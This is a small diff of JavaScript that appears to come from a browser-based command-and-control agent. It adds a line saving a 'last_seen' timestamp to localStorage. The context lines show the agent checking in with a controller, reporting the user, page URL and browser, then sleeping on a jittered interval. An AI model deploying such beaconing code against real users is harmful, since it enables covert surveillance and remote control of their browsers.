@@ -195,6 +195,7 @@ var tabID = sessionStorage.tabID &&
 if (localStorage.getItem('tab_id') == null){
     localStorage.setItem('tab_id',tabID);
 }
+localStorage.setItem('last_seen',JSON.stringify(new Date()));
 
 C2.checkin("127.0.0.1",0,bowser.user,window.location['href'],"N/A", "N/A", get_browser());
 sleepWakeUp(C2.interval, C2.jitter);
